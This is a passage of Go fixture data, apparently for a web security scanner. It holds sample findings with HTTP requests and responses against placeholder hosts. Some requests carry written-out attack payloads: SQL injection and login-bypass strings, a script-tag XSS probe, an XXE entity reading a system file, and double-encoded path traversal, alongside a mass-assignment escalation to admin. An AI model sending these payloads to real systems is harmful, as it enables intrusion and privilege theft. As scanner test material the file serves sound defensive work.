			Tags:             []string{"info", "headers", "best-practice"},
			MatchedAt:        []string{"https://blog.test/post/hello-world"},
			ExtractedResults: []string{"X-Content-Type-Options: missing", "X-Frame-Options: missing", "Content-Security-Policy: missing"},
			Request:          "GET /post/hello-world HTTP/1.1\r\nHost: blog.test\r\n\r\n",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\nServer: Apache/2.4\r\n\r\n<!DOCTYPE html>\n<html><head><title>Hello World — Blog</title></head>\n<body>\n<article><h1>Hello World</h1></article>\n</body></html>",
			FindingHash:      hashStr([]byte("info-missing-headers-blog.test-/post/hello-world")),
			FoundAt:          now.Add(-7 * time.Minute),
			CreatedAt:        now.Add(-7 * time.Minute),
		},
		// Sensitive data in response (API key leak)
		{
			HTTPRecordUUIDs:  []string{findRec("/api/v1/users/me")},
			ModuleID:         "info-sensitive-data",
			ModuleName:       "info",
			ModuleType:       database.ModuleTypePassive,
			ModuleShort:      "Detects sensitive data exposure in API responses",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "API response includes internal API key in user profile object",
			Severity:         "medium",
			Confidence:       "firm",
			Tags:             []string{"info", "sensitive-data", "api-key"},
			MatchedAt:        []string{"https://api.shop.local/api/v1/users/me"},
			ExtractedResults: []string{"api_key: sk-live-abc123xyz789def456"},
			Request:          "GET /api/v1/users/me HTTP/1.1\r\nHost: api.shop.local\r\nAuthorization: Bearer shop-api-token-abc123\r\n\r\n",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"id\":1,\"email\":\"user@shop.local\",\"name\":\"Shop Admin\",\"role\":\"admin\",\"api_key\":\"sk-live-abc123xyz789def456\",\"created_at\":\"2025-11-15T09:00:00Z\",\"last_login\":\"2026-02-25T08:30:00Z\"}",
			FindingHash:      hashStr([]byte("info-sensitive-data-api.shop.local-/api/v1/users/me")),
			FoundAt:          now.Add(-4*time.Hour - 10*time.Minute),
			CreatedAt:        now.Add(-4*time.Hour - 10*time.Minute),
		},
		// Backslash transformation on search parameter
		{
			HTTPRecordUUIDs:  []string{findRec("/search?q=test")},
			ScanUUID:         "scan-0001-aaaa-bbbb-cccc-ddddeeee0001",
			ModuleID:         "backslash-transformation",
			ModuleName:       "backslash-transformation",
			ModuleType:       database.ModuleTypeActive,
			ModuleShort:      "Detects backslash escape sequence interpretation",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "Backslash consumed in 'q' parameter — injected \\x41 transformed to 'A', indicating escape sequence interpretation",
			Severity:         "suspect",
			Confidence:       "firm",
			Tags:             []string{"behavior", "backslash", "escape-sequence"},
			MatchedAt:        []string{"https://example.com/search?q=\\x41"},
			ExtractedResults: []string{"\\x41 → A"},
			Request:          "GET /search?q=%5Cx41 HTTP/1.1\r\nHost: example.com\r\n\r\n",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<!DOCTYPE html>\n<html><head><title>Search Results</title></head>\n<body>\n<h1>Search Results</h1>\n<p>You searched for: A</p>\n<p>No results found.</p>\n</body></html>",
			FindingHash:      hashStr([]byte("backslash-transform-example.com-/search-q")),
			FoundAt:          now.Add(-75 * time.Minute),
			CreatedAt:        now.Add(-75 * time.Minute),
		},
		// Suspect transform — expression evaluation on admin settings
		{
			HTTPRecordUUIDs:  []string{findRec("/admin/settings")},
			ScanUUID:         "scan-0001-aaaa-bbbb-cccc-ddddeeee0001",
			ModuleID:         "suspect-transform",
			ModuleName:       "suspect-transform",
			ModuleType:       database.ModuleTypeActive,
			ModuleShort:      "Detects server-side expression evaluation in parameters",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "Expression evaluated in 'smtp_port' parameter — injected '3+4' returned '7', suggesting server-side evaluation",
			Severity:         "suspect",
			Confidence:       "firm",
			Tags:             []string{"behavior", "expression-eval", "suspect-transform"},
			MatchedAt:        []string{"https://admin.example.com:8443/admin/settings"},
			ExtractedResults: []string{"3+4 → 7"},
			Request:          "POST /admin/settings HTTP/1.1\r\nHost: admin.example.com:8443\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nsmtp_host=mail.example.com&smtp_port=3+4",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<!DOCTYPE html>\n<html><head><title>Settings Saved — Admin</title></head>\n<body>\n<h1>Settings Updated</h1>\n<table>\n<tr><td>SMTP Host</td><td>mail.example.com</td></tr>\n<tr><td>SMTP Port</td><td>7</td></tr>\n</table>\n</body></html>",
			FindingHash:      hashStr([]byte("suspect-transform-admin.example.com-/admin/settings-smtp_port")),
			FoundAt:          now.Add(-70 * time.Minute),
			CreatedAt:        now.Add(-70 * time.Minute),
		},
		// Smart behavior detection — differential response on login
		{
			HTTPRecordUUIDs:  []string{findRec("/api/v1/auth/login")},
			ScanUUID:         "scan-0002-aaaa-bbbb-cccc-ddddeeee0002",
			ModuleID:         "smart-behavior-detection",
			ModuleName:       "smart-behavior-detection",
			ModuleType:       database.ModuleTypeActive,
			ModuleShort:      "Detects differential behavior suggesting injection context",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "Differential behavior in 'username' parameter — semantically equivalent payloads produce different responses (timing delta 850ms), suggesting injection context",
			Severity:         "suspect",
			Confidence:       "firm",
			Tags:             []string{"behavior", "differential", "timing-anomaly"},
			MatchedAt:        []string{"https://api.shop.local/api/v1/auth/login"},
			ExtractedResults: []string{"timing_delta: 850ms", "status_match: true", "body_diff: 12%"},
			Request:          "POST /api/v1/auth/login HTTP/1.1\r\nHost: api.shop.local\r\nContent-Type: application/json\r\n\r\n{\"username\":\"admin' AND '1'='1\",\"password\":\"test\"}",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"error\":\"Invalid credentials\",\"attempts_remaining\":4}",
			AdditionalEvidence: []string{
				"POST /api/v1/auth/login HTTP/1.1\r\nHost: api.shop.local\r\nContent-Type: application/json\r\n\r\n{\"username\":\"admin' AND '1'='2\",\"password\":\"test\"}\n---------\nHTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"error\":\"Invalid credentials\",\"attempts_remaining\":4}",
				"POST /api/v1/auth/login HTTP/1.1\r\nHost: api.shop.local\r\nContent-Type: application/json\r\n\r\n{\"username\":\"admin\",\"password\":\"test\"}\n---------\nHTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"error\":\"Invalid credentials\",\"attempts_remaining\":5}",
			},
			FindingHash: hashStr([]byte("smart-behavior-api.shop.local-/api/v1/auth/login-username")),
			FoundAt:     now.Add(-65 * time.Minute),
			CreatedAt:   now.Add(-65 * time.Minute),
		},
		// Input behavior probe — HTML structure change on contact form
		{
			HTTPRecordUUIDs:  []string{findRec("/contact")},
			ScanUUID:         "scan-0001-aaaa-bbbb-cccc-ddddeeee0001",
			ModuleID:         "input-behavior-probe",
			ModuleName:       "input-behavior-probe",
			ModuleType:       database.ModuleTypeActive,
			ModuleShort:      "Detects HTML structure changes from fuzz payloads",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "HTML tag count changed after injecting fuzz payload in 'message' field — baseline 42 tags vs injected 45 tags, new <img> and <script> elements appeared",
			Severity:         "suspect",
			Confidence:       "tentative",
			Tags:             []string{"behavior", "html-structure", "fuzz-signal"},
			MatchedAt:        []string{"https://example.com/contact"},
			ExtractedResults: []string{"tag_delta: +3", "new_tags: img, script"},
			Request:          "POST /contact HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nname=test&email=test@test.com&message=<img/src=x>",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<!DOCTYPE html>\n<html><head><title>Contact — Example</title></head>\n<body>\n<h1>Message Received</h1>\n<p>Thank you, test. Your message:</p>\n<div class=\"msg\"><img/src=x></div>\n</body></html>",
			FindingHash:      hashStr([]byte("input-behavior-probe-example.com-/contact-message")),
			FoundAt:          now.Add(-60 * time.Minute),
			CreatedAt:        now.Add(-60 * time.Minute),
		},
		// Anomaly ranking — statistical outlier on API endpoint
		{
			HTTPRecordUUIDs:  []string{findRec("/api/v2/beta/experimental")},
			ScanUUID:         "scan-0002-aaaa-bbbb-cccc-ddddeeee0002",
			ModuleID:         "anomaly-ranking",
			ModuleName:       "anomaly-ranking",
			ModuleType:       database.ModuleTypePassive,
			ModuleShort:      "Detects statistical outlier responses across host",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "Response is a statistical outlier for api.shop.local — body size 120B is 4.2σ below host mean (15420B), unusual content-type for this host",
			Severity:         "suspect",
			Confidence:       "tentative",
			Tags:             []string{"anomaly", "statistical", "outlier"},
			MatchedAt:        []string{"https://api.shop.local/api/v2/beta/experimental"},
			ExtractedResults: []string{"z_score: -4.2", "body_size: 120B", "host_mean: 15420B"},
			Request:          "GET /api/v2/beta/experimental HTTP/1.1\r\nHost: api.shop.local\r\nAuthorization: Bearer shop-api-token-abc123\r\n\r\n",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"status\":\"ok\",\"version\":\"2.0.0-beta\",\"features\":[\"experimental\"]}",
			FindingHash:      hashStr([]byte("anomaly-ranking-api.shop.local-/api/v2/beta/experimental")),
			FoundAt:          now.Add(-55 * time.Minute),
			CreatedAt:        now.Add(-55 * time.Minute),
		},
		// Wildcard injection — unescaped wildcard changes query behavior
		{
			HTTPRecordUUIDs:  []string{findRec("/api/v1/products")},
			ScanUUID:         "scan-0002-aaaa-bbbb-cccc-ddddeeee0002",
			ModuleID:         "wildcard-injection",
			ModuleName:       "wildcard-injection",
			ModuleType:       database.ModuleTypeActive,
			ModuleShort:      "Detects wildcard character interpretation in query layer",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "Wildcard character '*' in 'search' parameter changes result count from 12 to 847 — backend may interpret wildcards in query layer (LDAP, SQL LIKE, or Elasticsearch)",
			Severity:         "suspect",
			Confidence:       "firm",
			Tags:             []string{"behavior", "wildcard", "query-manipulation"},
			MatchedAt:        []string{"https://api.shop.local/api/v1/products?search=*"},
			ExtractedResults: []string{"baseline_count: 12", "injected_count: 847", "delta: +835"},
			Request:          "GET /api/v1/products?search=* HTTP/1.1\r\nHost: api.shop.local\r\nAuthorization: Bearer shop-api-token-abc123\r\n\r\n",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"results\":[...],\"total\":847,\"page\":1}",
			FindingHash:      hashStr([]byte("wildcard-injection-api.shop.local-/api/v1/products-search")),
			FoundAt:          now.Add(-52 * time.Minute),
			CreatedAt:        now.Add(-52 * time.Minute),
		},
		// Response size anomaly — unusually large error response on profile page
		{
			HTTPRecordUUIDs:  []string{findRec("/profile/1")},
			ScanUUID:         "scan-0001-aaaa-bbbb-cccc-ddddeeee0001",
			ModuleID:         "response-anomaly",
			ModuleName:       "response-anomaly",
			ModuleType:       database.ModuleTypePassive,
			ModuleShort:      "Detects anomalous response size patterns",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "Error response body is 3.8x larger than success response for same endpoint — may contain stack trace, debug info, or internal paths",
			Severity:         "suspect",
			Confidence:       "tentative",
			Tags:             []string{"anomaly", "response-size", "error-verbose"},
			MatchedAt:        []string{"https://example.com/profile/1"},
			ExtractedResults: []string{"success_size: 7500B", "error_size: 28500B", "ratio: 3.8x"},
			Request:          "GET /profile/999999 HTTP/1.1\r\nHost: example.com\r\nAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc\r\n\r\n",
			Response:         "HTTP/1.1 500 Internal Server Error\r\nContent-Type: text/html\r\n\r\n<!DOCTYPE html>\n<html><head><title>Error</title></head>\n<body>\n<h1>Internal Server Error</h1>\n<pre>Traceback (most recent call last):\n  File \"/app/views/profile.py\", line 42\n    user = db.query(User).filter_by(id=999999).one()\nNoResultFound: No row was found\n</pre>\n</body></html>",
			FindingHash:      hashStr([]byte("response-anomaly-example.com-/profile")),
			FoundAt:          now.Add(-48 * time.Minute),
			CreatedAt:        now.Add(-48 * time.Minute),
		},
		// Timing anomaly — comment endpoint significantly slower with special chars
		{
			HTTPRecordUUIDs:  []string{findRec("/post/hello-world/comment")},
			ScanUUID:         "scan-0003-aaaa-bbbb-cccc-ddddeeee0003",
			ModuleID:         "timing-anomaly",
			ModuleName:       "timing-anomaly",
			ModuleType:       database.ModuleTypeActive,
			ModuleShort:      "Detects timing-based anomalies suggesting blind injection",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "Response time for 'body' parameter increased from 220ms baseline to 1850ms when injecting single quote — consistent across 3 retries, suggesting query-layer processing",
			Severity:         "suspect",
			Confidence:       "firm",
			Tags:             []string{"behavior", "timing", "blind-injection"},
			MatchedAt:        []string{"https://blog.test/post/hello-world/comment"},
			ExtractedResults: []string{"baseline_ms: 220", "injected_ms: 1850", "delta_ms: 1630", "retries: 3"},
			Request:          "POST /post/hello-world/comment HTTP/1.1\r\nHost: blog.test\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: session=blogsess123\r\n\r\nauthor=Alice&body=test'&email=alice@test.com",
			Response:         "HTTP/1.1 500 Internal Server Error\r\nContent-Type: text/html\r\n\r\n<!DOCTYPE html>\n<html><head><title>Error</title></head>\n<body>\n<h1>Something went wrong</h1>\n<p>We encountered an unexpected error. Please try again.</p>\n</body></html>",
			AdditionalEvidence: []string{
				"POST /post/hello-world/comment HTTP/1.1\r\nHost: blog.test\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: session=blogsess123\r\n\r\nauthor=Alice&body=test'&email=alice@test.com\n---------\nHTTP/1.1 500 Internal Server Error\r\nContent-Type: text/html\r\n\r\n<!DOCTYPE html>\n<html><head><title>Error</title></head>\n<body><h1>Something went wrong</h1></body></html>",
				"POST /post/hello-world/comment HTTP/1.1\r\nHost: blog.test\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: session=blogsess123\r\n\r\nauthor=Alice&body=test'&email=alice@test.com\n---------\nHTTP/1.1 500 Internal Server Error\r\nContent-Type: text/html\r\n\r\n<!DOCTYPE html>\n<html><head><title>Error</title></head>\n<body><h1>Something went wrong</h1></body></html>",
				"POST /post/hello-world/comment HTTP/1.1\r\nHost: blog.test\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: session=blogsess123\r\n\r\nauthor=Alice&body=test&email=alice@test.com\n---------\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<!DOCTYPE html>\n<html><head><title>Comment Posted</title></head>\n<body><h1>Comment posted successfully</h1></body></html>",
			},
			FindingHash: hashStr([]byte("timing-anomaly-blog.test-/post/hello-world/comment-body")),
			FoundAt:     now.Add(-45 * time.Minute),
			CreatedAt:   now.Add(-45 * time.Minute),
		},
		// Content-type mismatch — JSON endpoint returns HTML on crafted input
		{
			HTTPRecordUUIDs:  []string{findRec("/api/v1/orders")},
			ScanUUID:         "scan-0002-aaaa-bbbb-cccc-ddddeeee0002",
			ModuleID:         "content-type-mismatch",
			ModuleName:       "content-type-mismatch",
			ModuleType:       database.ModuleTypePassive,
			ModuleShort:      "Detects content-type confusion between expected and actual response",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "Endpoint normally returns application/json but switched to text/html when 'shipping' parameter contained angle brackets — content-type confusion may enable XSS in API consumers",
			Severity:         "suspect",
			Confidence:       "tentative",
			Tags:             []string{"anomaly", "content-type", "api-confusion"},
			MatchedAt:        []string{"https://api.shop.local/api/v1/orders"},
			ExtractedResults: []string{"expected_ct: application/json", "actual_ct: text/html", "trigger: angle brackets in shipping"},
			Request:          "POST /api/v1/orders HTTP/1.1\r\nHost: api.shop.local\r\nContent-Type: application/json\r\nAuthorization: Bearer shop-api-token-abc123\r\n\r\n{\"product_id\":42,\"quantity\":1,\"shipping\":\"<script>alert(1)</script>\"}",
			Response:         "HTTP/1.1 400 Bad Request\r\nContent-Type: text/html\r\n\r\n<html><body><h1>Bad Request</h1><p>Invalid shipping method: <script>alert(1)</script></p></body></html>",
			FindingHash:      hashStr([]byte("content-type-mismatch-api.shop.local-/api/v1/orders-shipping")),
			FoundAt:          now.Add(-42 * time.Minute),
			CreatedAt:        now.Add(-42 * time.Minute),
		},
		// Reflection detection — input echoed in HTTP header
		{
			HTTPRecordUUIDs:  []string{findRec("/graphql")},
			ScanUUID:         "scan-0001-aaaa-bbbb-cccc-ddddeeee0001",
			ModuleID:         "header-reflection",
			ModuleName:       "header-reflection",
			ModuleType:       database.ModuleTypeActive,
			ModuleShort:      "Detects user input reflection in HTTP response headers",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "User-controlled input from GraphQL query variable reflected in X-Debug-Query response header — header injection or information leak possible",
			Severity:         "suspect",
			Confidence:       "firm",
			Tags:             []string{"behavior", "reflection", "header-injection"},
			MatchedAt:        []string{"https://example.com/graphql"},
			ExtractedResults: []string{"reflected_in: X-Debug-Query header", "input: { user(id: 1) }"},
			Request:          "POST /graphql HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/json\r\n\r\n{\"query\":\"{ user(id: 1) { name email role } }\"}",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nX-Debug-Query: { user(id: 1) { name email role } }\r\n\r\n{\"data\":{\"user\":{\"name\":\"admin\",\"email\":\"admin@example.com\",\"role\":\"superuser\"}}}",
			FindingHash:      hashStr([]byte("header-reflection-example.com-/graphql-query")),
			FoundAt:          now.Add(-38 * time.Minute),
			CreatedAt:        now.Add(-38 * time.Minute),
		},
		// Encoding bypass — double URL encoding accepted
		{
			HTTPRecordUUIDs:  []string{findRec("/admin/logs")},
			ScanUUID:         "scan-0001-aaaa-bbbb-cccc-ddddeeee0001",
			ModuleID:         "encoding-bypass",
			ModuleName:       "encoding-bypass",
			ModuleType:       database.ModuleTypeActive,
			ModuleShort:      "Detects multi-layer URL decoding bypass",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "Double URL-encoded path traversal in 'file' parameter decoded by server — %252e%252e%252f interpreted as ../, suggesting multi-layer decoding",
			Severity:         "suspect",
			Confidence:       "firm",
			Tags:             []string{"behavior", "encoding", "double-decode", "path-traversal"},
			MatchedAt:        []string{"https://admin.example.com:8443/admin/logs?file=%252e%252e%252fetc%252fhosts"},
			ExtractedResults: []string{"%252e%252e%252f → ../", "decoded_path: ../etc/hosts"},
			Request:          "GET /admin/logs?file=%252e%252e%252fetc%252fhosts HTTP/1.1\r\nHost: admin.example.com:8443\r\nAuthorization: Basic YWRtaW46cGFzc3dvcmQ=\r\n\r\n",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n127.0.0.1 localhost\n::1 localhost\n10.0.0.50 api.shop.local\n10.0.0.51 db.internal",
			FindingHash:      hashStr([]byte("encoding-bypass-admin.example.com-/admin/logs-file")),
			FoundAt:          now.Add(-35 * time.Minute),
			CreatedAt:        now.Add(-35 * time.Minute),
		},
		// HTTP method override — POST treated as DELETE via X-HTTP-Method-Override
		{
			HTTPRecordUUIDs:  []string{findRec("/api/v1/products/42")},
			ScanUUID:         "scan-0002-aaaa-bbbb-cccc-ddddeeee0002",
			ModuleID:         "method-override",
			ModuleName:       "method-override",
			ModuleType:       database.ModuleTypeActive,
			ModuleShort:      "Detects HTTP method override via headers",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "X-HTTP-Method-Override header accepted — POST request with X-HTTP-Method-Override: DELETE returned 204 No Content, bypassing method restrictions",
			Severity:         "suspect",
			Confidence:       "firm",
			Tags:             []string{"behavior", "method-override", "access-control"},
			MatchedAt:        []string{"https://api.shop.local/api/v1/products/42"},
			ExtractedResults: []string{"override_header: X-HTTP-Method-Override", "effective_method: DELETE", "status: 204"},
			Request:          "POST /api/v1/products/42 HTTP/1.1\r\nHost: api.shop.local\r\nX-HTTP-Method-Override: DELETE\r\nAuthorization: Bearer shop-api-token-abc123\r\n\r\n",
			Response:         "HTTP/1.1 204 No Content\r\n\r\n",
			AdditionalEvidence: []string{
				"POST /api/v1/products/42 HTTP/1.1\r\nHost: api.shop.local\r\nAuthorization: Bearer shop-api-token-abc123\r\n\r\n\n---------\nHTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"id\":42,\"name\":\"Widget Pro\",\"price\":29.99}",
			},
			FindingHash: hashStr([]byte("method-override-api.shop.local-/api/v1/products")),
			FoundAt:     now.Add(-32 * time.Minute),
			CreatedAt:   now.Add(-32 * time.Minute),
		},
		// SOAP parameter manipulation — XML entity processed
		{
			HTTPRecordUUIDs:  []string{findRec("/api/soap/UserService")},
			ScanUUID:         "scan-0001-aaaa-bbbb-cccc-ddddeeee0001",
			ModuleID:         "xml-entity-probe",
			ModuleName:       "xml-entity-probe",
			ModuleType:       database.ModuleTypeActive,
			ModuleShort:      "Detects XML external entity processing in SOAP/XML endpoints",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "XML external entity reference in SOAP body not rejected — server processed &amp;xxe; entity without error, response size changed from 1800B to 1200B suggesting entity expansion or error",
			Severity:         "suspect",
			Confidence:       "tentative",
			Tags:             []string{"behavior", "xxe", "xml", "soap"},
			MatchedAt:        []string{"https://example.com/api/soap/UserService"},
			ExtractedResults: []string{"baseline_size: 1800B", "injected_size: 1200B", "entity: &xxe;"},
			Request:          "POST /api/soap/UserService HTTP/1.1\r\nHost: example.com\r\nContent-Type: text/xml; charset=UTF-8\r\nSOAPAction: GetUser\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><GetUser><ID>&xxe;</ID></GetUser></soap:Body></soap:Envelope>",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: text/xml; charset=UTF-8\r\n\r\n<?xml version=\"1.0\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><GetUserResponse><Error>User not found</Error></GetUserResponse></soap:Body></soap:Envelope>",
			FindingHash:      hashStr([]byte("xml-entity-probe-example.com-/api/soap/UserService")),
			FoundAt:          now.Add(-28 * time.Minute),
			CreatedAt:        now.Add(-28 * time.Minute),
		},
		// Cookie reflection — session cookie value reflected in response body
		{
			HTTPRecordUUIDs:  []string{findRec("/account/preferences")},
			ScanUUID:         "scan-0001-aaaa-bbbb-cccc-ddddeeee0001",
			ModuleID:         "cookie-reflection",
			ModuleName:       "cookie-reflection",
			ModuleType:       database.ModuleTypePassive,
			ModuleShort:      "Detects cookie value reflection in response body",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "Session cookie value 'theme=dark' reflected verbatim in HTML response body inside a <script> block — cookie-based XSS vector if cookie is controllable",
			Severity:         "suspect",
			Confidence:       "tentative",
			Tags:             []string{"behavior", "cookie", "reflection", "xss-vector"},
			MatchedAt:        []string{"https://example.com/account/preferences"},
			ExtractedResults: []string{"cookie: theme=dark", "context: script block", "reflected_value: dark"},
			Request:          "GET /account/preferences HTTP/1.1\r\nHost: example.com\r\nCookie: session=xyz789; theme=dark; lang=en; _ga=GA1.2.123456\r\n\r\n",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n<!DOCTYPE html>\n<html><head><title>Preferences</title>\n<script>var userTheme = \"dark\";</script></head>\n<body>\n<h1>Your Preferences</h1>\n<p>Current theme: dark</p>\n</body></html>",
			FindingHash:      hashStr([]byte("cookie-reflection-example.com-/account/preferences-theme")),
			FoundAt:          now.Add(-25 * time.Minute),
			CreatedAt:        now.Add(-25 * time.Minute),
		},

		// =====================================================================
		// Agent findings — from autopilot/swarm/query agent modes
		// =====================================================================

		// Agent: IDOR found by autopilot agent
		{
			HTTPRecordUUIDs:  []string{findRec("/api/v1/users/me")},
			ScanUUID:         "scan-0001-aaaa-bbbb-cccc-ddddeeee0001",
			AgenticScanUUID:  "agent-0002-aaaa-bbbb-cccc-ddddeeee0002",
			URL:              "https://api.shop.local/api/v1/users/2",
			Hostname:         "api.shop.local",
			ModuleID:         "agent-idor",
			ModuleName:       "Agent IDOR Detection",
			ModuleType:       database.ModuleTypeAgent,
			ModuleShort:      "AI agent detected insecure direct object reference",
			FindingSource:    database.FindingSourceAgent,
			Description:      "IDOR in user profile endpoint — authenticated user can access other users' profiles by changing the user ID in the URL path. Agent confirmed by comparing response for own ID (1) vs another user's ID (2)",
			Severity:         "high",
			Confidence:       "certain",
			Tags:             []string{"agent", "idor", "access-control", "owasp-a1", "cwe-639"},
			Status:           "triaged",
			Remediation:      "Implement authorization check: verify the authenticated user's ID matches the requested resource ID, or restrict to admin role",
			CWEID:            "CWE-639",
			CVSSScore:        7.5,
			MatchedAt:        []string{"https://api.shop.local/api/v1/users/2"},
			ExtractedResults: []string{"user_id: 2 (not owned)", "leaked_fields: email, name, role, api_key"},
			Request:          "GET /api/v1/users/2 HTTP/1.1\r\nHost: api.shop.local\r\nAuthorization: Bearer shop-api-token-abc123\r\n\r\n",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"id\":2,\"email\":\"jane@shop.local\",\"name\":\"Jane Doe\",\"role\":\"user\",\"api_key\":\"sk-live-jane-secret-key\",\"created_at\":\"2025-12-01T10:00:00Z\"}",
			AdditionalEvidence: []string{
				"GET /api/v1/users/1 HTTP/1.1\r\nHost: api.shop.local\r\nAuthorization: Bearer shop-api-token-abc123\r\n\r\n\n---------\nHTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"id\":1,\"email\":\"user@shop.local\",\"name\":\"Shop Admin\",\"role\":\"admin\",\"api_key\":\"sk-live-abc123xyz789def456\"}",
				"Agent reasoning: Compared user/1 (own profile) with user/2 (other user). Both return 200 with full PII including api_key. No authorization boundary between users.",
			},
			FindingHash: hashStr([]byte("agent-idor-api.shop.local-/api/v1/users")),
			FoundAt:     now.Add(-2*time.Hour - 28*time.Minute),
			CreatedAt:   now.Add(-2*time.Hour - 28*time.Minute),
		},
		// Agent: Mass assignment found by swarm agent
		{
			HTTPRecordUUIDs:  []string{findRec("/api/v1/users/me")},
			ScanUUID:         "scan-0002-aaaa-bbbb-cccc-ddddeeee0002",
			AgenticScanUUID:  "agent-0003-aaaa-bbbb-cccc-ddddeeee0003",
			URL:              "https://api.shop.local/api/v1/users/me",
			Hostname:         "api.shop.local",
			ModuleID:         "agent-mass-assignment",
			ModuleName:       "Agent Mass Assignment",
			ModuleType:       database.ModuleTypeAgent,
			ModuleShort:      "AI agent detected mass assignment vulnerability",
			FindingSource:    database.FindingSourceAgent,
			Description:      "Mass assignment allows privilege escalation — PATCH /api/v1/users/me accepts 'role' field, allowing any authenticated user to set their own role to 'admin'. Agent confirmed by sending PATCH with {\"role\":\"admin\"} and verifying the role change in subsequent GET",
			Severity:         "critical",
			Confidence:       "certain",
			Tags:             []string{"agent", "mass-assignment", "privilege-escalation", "cwe-915"},
			Status:           "triaged",
			Remediation:      "Add an allowlist of updatable fields in the PATCH handler. Exclude 'role', 'is_admin', and other privilege fields from user-modifiable attributes",
			CWEID:            "CWE-915",
			CVSSScore:        9.1,
			MatchedAt:        []string{"https://api.shop.local/api/v1/users/me"},
			ExtractedResults: []string{"field: role", "before: user", "after: admin"},
			Request:          "PATCH /api/v1/users/me HTTP/1.1\r\nHost: api.shop.local\r\nContent-Type: application/json\r\nAuthorization: Bearer shop-api-token-abc123\r\n\r\n{\"name\":\"Shop Admin\",\"role\":\"admin\"}",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"id\":1,\"email\":\"user@shop.local\",\"name\":\"Shop Admin\",\"role\":\"admin\",\"updated_at\":\"2026-03-29T10:30:00Z\"}",
			AdditionalEvidence: []string{
				"Verification — GET after PATCH:\nGET /api/v1/users/me HTTP/1.1\r\nHost: api.shop.local\r\nAuthorization: Bearer shop-api-token-abc123\r\n\r\n\n---------\nHTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"id\":1,\"email\":\"user@shop.local\",\"name\":\"Shop Admin\",\"role\":\"admin\",\"api_key\":\"sk-live-abc123xyz789def456\"}",
				"Agent reasoning: Source analysis of app/routes/users.py:34 showed User.update(**request.json()) without field filtering. Confirmed by sending role field in PATCH body — server accepted and persisted the role change.",
			},
			FindingHash: hashStr([]byte("agent-mass-assign-api.shop.local-/api/v1/users/me")),
			FoundAt:     now.Add(-1*time.Hour - 15*time.Minute),
			CreatedAt:   now.Add(-1*time.Hour - 15*time.Minute),
		},
		// Agent: Auth bypass found by query agent (code review)
		{
			HTTPRecordUUIDs:  []string{findRec("/api/v1/auth/login")},
			ScanUUID:         "scan-0002-aaaa-bbbb-cccc-ddddeeee0002",
			AgenticScanUUID:  "agent-0001-aaaa-bbbb-cccc-ddddeeee0001",
			URL:              "https://api.shop.local/api/v1/auth/login",
			Hostname:         "api.shop.local",
			ModuleID:         "agent-auth-bypass",
			ModuleName:       "Agent Authentication Bypass",
			ModuleType:       database.ModuleTypeAgent,
			ModuleShort:      "AI agent detected authentication bypass via code review",
			FindingSource:    database.FindingSourceAgent,
			Description:      "Authentication bypass via SQL injection in login endpoint — source review identified raw SQL in auth handler. Agent crafted payload that bypasses password check: username=' OR 1=1-- returns first user (admin) token",
			Severity:         "critical",
			Confidence:       "certain",
			Tags:             []string{"agent", "auth-bypass", "sqli", "cwe-287"},
			Status:           "triaged",
			Remediation:      "Use parameterized queries in the login handler and implement rate limiting. Replace: f\"SELECT * FROM users WHERE username='{username}'\" with db.execute(\"SELECT * FROM users WHERE username = ?\", [username])",
			CWEID:            "CWE-287",
			CVSSScore:        9.8,
			SourceFile:       "/opt/repos/shop-api/app/routes/auth.py:28",
